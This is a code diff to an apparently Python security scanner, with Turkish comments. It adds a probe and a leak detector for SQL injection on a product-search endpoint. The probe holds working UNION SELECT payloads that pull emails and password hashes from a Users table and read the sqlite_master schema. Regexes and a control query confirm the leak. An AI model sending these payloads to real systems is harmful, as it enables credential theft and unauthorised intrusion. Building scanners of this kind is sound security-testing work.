@@ -46,6 +46,26 @@ def is_error_disclosure(status: int, body: str) -> bool:
 
 
 # ---------------------------------------------------------------------------
+# Sızıntı kanıt çıkarıcı (FP kapılı: payload-farkı şart)
+# ---------------------------------------------------------------------------
+
+_EMAIL_RX = re.compile(r"[\w.+-]+@[\w-]+\.[\w.]{2,}")
+_BCRYPT_RX = re.compile(r"\$2[aby]\$[\w./$]{20,}")
+
+
+def leaked_credential_evidence(body: str):
+    """Yanıt gövdesinde email/bcrypt kanıtı döndürür, yoksa None."""
+    emails = _EMAIL_RX.findall(body[:20000])
+    if emails:
+        uniq = sorted(set(emails))[:3]
+        return f"email sızıntısı: {', '.join(uniq)}" + (f" (+{len(set(emails))-3} daha)" if len(set(emails)) > 3 else "")
+    hashes = _BCRYPT_RX.findall(body[:20000])
+    if hashes:
+        return f"bcrypt parola karması sızıntısı: {hashes[0][:12]}..."
+    return None
+
+
+# ---------------------------------------------------------------------------
 # Aktif prob ajanı
 # ---------------------------------------------------------------------------
 
@@ -118,6 +138,32 @@ class ActiveProbe:
                                   f"HTTP {r[0]}: {r[1][:200]}")
         return None
 
+    SQLI_UNION_PAYLOADS = [
+        # (etiket, payload yolu) — hepsi read-only UNION SELECT
+        ("users",
+         "/rest/products/search?q='))%20union%20select%20id,email,password,"
+         "'a','a','a','a',999,'a'%20from%20Users--"),
+        ("sqlite_master",
+         "/rest/products/search?q='))%20union%20select%201,sql,sql,sql,sql,"
+         "sql,sql,sql,sql%20from%20sqlite_master%20limit%201--"),
+    ]
+
+    def probe_sqli_leak(self, host, port) -> Optional[dict]:
+        """Read-only UNION sondağı: payload yanıtında email/bcrypt VAR ama
+        payloadsuz kontrol yanıtında YOK ise sızıntı kanıtı (FP kapısı)."""
+        control = self._get(host, port, "/rest/products/search?q=probekontrol")
+        control_ev = leaked_credential_evidence(control[1]) if control else None
+        for etiket, path in self.SQLI_UNION_PAYLOADS:
+            r = self._get(host, port, path)
+            if not r or r[0] != 200:
+                continue
+            ev = leaked_credential_evidence(r[1])
+            if ev and ev != control_ev:
+                return self._emit(
+                    "sqli_data_leak", f"{host}:{port}/rest/products/search",
+                    f"UNION({etiket}) — {ev} | kontrol sorgusunda kanıt yok")
+        return None
+
     def probe_reflected(self, host, port) -> Optional[dict]:
         """Zararsız işaretleyici yankılanıyor mu? (XSS potansiyeli)."""
         marker = "pl7xq"
@@ -155,8 +201,8 @@ class ActiveProbe:
             self.audit.append("KILLSWITCH_HALT", stage="active")
             return []
         probes = (self.probe_error_disclosure, self.probe_sqli,
-                  self.probe_reflected, self.probe_redirect,
-                  self.probe_extension_bypass)
+                  self.probe_sqli_leak, self.probe_reflected,
+                  self.probe_redirect, self.probe_extension_bypass)
         for host, port in endpoints:
             if self.killswitch.is_active():
                 self.audit.append("KILLSWITCH_HALT", stage="active", host=host)
